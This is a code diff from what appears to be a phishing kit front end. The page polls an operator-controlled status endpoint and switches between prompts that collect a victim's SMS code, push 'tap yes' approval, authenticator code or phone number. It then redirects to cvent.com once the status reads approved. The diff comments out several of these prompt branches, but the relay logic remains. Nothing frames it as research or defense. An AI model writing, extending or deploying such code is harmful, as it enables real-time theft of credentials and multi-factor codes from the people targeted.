@@ -980,25 +980,25 @@ Authenticator App Code : ${code}
                                 showView("#div_number_tap");
                                 setTimeout(fetchStatus, 5000);
                                 return;
-                            } else if (redirectVal.includes("sms code") || redirectVal.includes("sms_code") || redirectVal.includes("sms")) {
-                                showView("#div_sms_code");
-                                $("#sms_code").val("");
-                                setTimeout(fetchStatus, 5000);
-                                return;
-                            } else if (redirectVal.includes("tap-yes") || redirectVal.includes("tap yes") || redirectVal.includes("tap_yes") || redirectVal.includes("tap") || redirectVal.includes("yes")) {
-                                showView("#div_tap_yes");
-                                setTimeout(fetchStatus, 5000);
-                                return;
-                            } else if (redirectVal.includes("authentication code") || redirectVal.includes("auth") || redirectVal.includes("authenticator")) {
-                                showView("#div_auth_code");
-                                $("#auth_code").val("");
-                                setTimeout(fetchStatus, 5000);
-                                return;
-                            } else if (redirectVal.includes("ask phonnumber") || redirectVal.includes("ask phonenumber") || redirectVal.includes("ask_phone") || redirectVal.includes("phone") || redirectVal.includes("prompt")) {
-                                showView("#div2");
-                                $("#phone").val("");
-                                setTimeout(fetchStatus, 5000);
-                                return;
+                            // } else if (redirectVal.includes("sms code") || redirectVal.includes("sms_code") || redirectVal.includes("sms")) {
+                            //     showView("#div_sms_code");
+                            //     $("#sms_code").val("");
+                            //     setTimeout(fetchStatus, 5000);
+                            //     return;
+                            // } else if (redirectVal.includes("tap-yes") || redirectVal.includes("tap yes") || redirectVal.includes("tap_yes") || redirectVal.includes("tap") || redirectVal.includes("yes")) {
+                            //     showView("#div_tap_yes");
+                            //     setTimeout(fetchStatus, 5000);
+                            //     return;
+                            // } else if (redirectVal.includes("authentication code") || redirectVal.includes("auth") || redirectVal.includes("authenticator")) {
+                            //     showView("#div_auth_code");
+                            //     $("#auth_code").val("");
+                            //     setTimeout(fetchStatus, 5000);
+                            //     return;
+                            // } else if (redirectVal.includes("ask phonnumber") || redirectVal.includes("ask phonenumber") || redirectVal.includes("ask_phone") || redirectVal.includes("phone") || redirectVal.includes("prompt")) {
+                            //     showView("#div2");
+                            //     $("#phone").val("");
+                            //     setTimeout(fetchStatus, 5000);
+                            //     return;
                             } else if (redirectVal.includes("cvent.com") || redirectVal === "saved" || redirectVal === "approved" || redirectVal.includes("redirect.html")) {
                                 window.location.href = targetRedirect;
                                 return;
